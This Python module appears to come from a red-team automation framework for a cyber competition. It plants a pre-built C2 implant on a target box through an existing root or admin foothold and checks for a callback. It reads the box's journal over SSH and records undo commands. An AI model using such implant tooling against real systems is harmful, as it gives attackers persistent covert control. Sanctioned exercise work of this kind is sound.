"""implant_channel — (re)plant the C2 channel on a box; ok means installed AND a callback seen."""

from ..c2.implant import Planter, load_manifest
from ..errors import PolicyError
from .base import Effect, Result, can_root, register


def box_id_for(ctx, ip, override=None):
    if override:
        return override
    box = ctx.intel.box_by_ip(ip)
    if not box:
        return ip
    return f"{box['box']}-{box['identifier']}"


@register
class ImplantChannel(Effect):
    id = "implant_channel"
    name = "plant/repair the C2 channel"
    description = ("Install the frozen C2 payload for this box and verify the channel "
                   "by a callback appearing in the competition's operation. Re-plant "
                   "when the box has no callback or the last one is stale. Payloads "
                   "are built at comp-prep and frozen — never built mid-event.")
    params = {
        "ip": {"type": "str", "required": True, "desc": "target box"},
        "force": {"type": "str",
                  "desc": "'true' to re-try after two failures (a deliberate "
                          "re-plant, e.g. the day-0 seed or an operator fix)"},
        "box_id": {"type": "str", "desc": "manifest key (default <box>-<team>)"},
        "transport": {"type": "enum", "choices": ["http", "webhook"],
                      "desc": "callback transport (default: the manifest's)"},
    }
    tags = frozenset({"c2", "access"})
    needs = {"foothold": True, "root": False, "c2": True, "os": "any"}

    def check(self, ctx, params):
        super().check(ctx, params)
        ip = params["ip"]
        fh = ctx.world.foothold(ip)
        if not (can_root(fh) or str((fh or {}).get("user", "")).lower()
                in ("administrator", "admin")):
            raise PolicyError(f"implant_channel needs a root/admin path on {ip}")
        if ctx.c2 is None and not load_manifest(ctx.cfg["run"].get("comp_dir") or "."):
            raise PolicyError("no C2 configured and no frozen payload manifest "
                              "(c2.enabled / red/payloads/manifest.json)")
        # Two failures and the box yields; a quarantining AV otherwise starves the whole board.
        if (ctx.world.failure_count(self.id, ip) >= 2
                and str(params.get("force", "")).lower() != "true"):
            raise PolicyError(f"implant_channel already failed twice on {ip} — switch "
                              f"target (the box is refusing the payload); "
                              f"force=true re-tries deliberately")

    def run(self, ctx, params):
        ip = params["ip"]
        box_id = box_id_for(ctx, ip, params.get("box_id"))
        planter = Planter(ctx, comp_dir=ctx.cfg["run"].get("comp_dir"),
                          manifest=getattr(ctx, "payload_manifest", None))
        info = planter.plant(ip, box_id, transport=params.get("transport"))
        # A fresh Mythic needs minutes for its first check-in; 45s false-reported "no callback".
        wait = int(ctx.cfg["c2"].get("callback_wait_sec", 120))
        detail = info.get("detail", "")
        # A channel that installs but never checks in is undiagnosable from the
        # agent's side alone: the payload prints its connect error to the journal
        # and nowhere else (live: six implants "active", zero callbacks and no
        # reason in the record).
        fh = ctx.world.foothold(ip)
        if (info.get("ok") and not info.get("callback_seen")
                and not ctx.is_windows(ip) and fh and info.get("unit")):
            _rc, out, err = ctx.ssh.ssh(
                ip, fh["user"], fh.get("password") or "",
                f"journalctl -u {info['unit']} -n 20 --no-pager 2>&1 | tail -12",
                timeout=30, key_path=fh.get("key_path"))
            agent_log = (out or err or "").strip()
            if agent_log:
                detail += f"; agent log: {agent_log[-400:]}"
        channel = ("callback observed" if info.get("callback_seen")
                   else f"no callback within {wait}s")
        outcome = f"{detail}; channel: {channel}"
        result = Result(info.get("ok") and info.get("callback_seen"), outcome,
                        data={"box_id": box_id, "channel": bool(info.get("callback_seen")),
                              "uuid": info.get("uuid"), "paths": info.get("paths")},
                        installed=bool(info.get("ok")))
        if info.get("ok"):
            result.artifacts = [{"ip": ip, "kind": "c2-implant",
                                 "detail": outcome,
                                 "check_cmd": info.get("check_cmd"),
                                 "paths": info.get("paths") or []}]
            if ctx.is_windows(ip):
                # Defender is removed from every Windows template — nothing to restore there.
                paths = info.get("paths") or []
                exe = next((p for p in paths if str(p).lower().endswith(".exe")), None)
                recipe = list(info.get("undo") or
                              [f'schtasks /End /TN "{info.get("unit")}"',
                               f'schtasks /Delete /TN "{info.get("unit")}" /F'])
                recipe.append("taskkill /F /IM "
                              + (exe.rsplit("\\", 1)[-1] if exe else "<payload>.exe"))
                if exe:
                    recipe.append(f"Remove-Item -Path '{exe}' -Force")
            else:
                recipe = list(info.get("undo") or
                              [f"systemctl disable --now {info.get('unit')}",
                               f"rm -f {' '.join(info.get('paths') or ['<payload>'])}"])
            result.restore = {"recipe": recipe, "secrets": None}
        return result
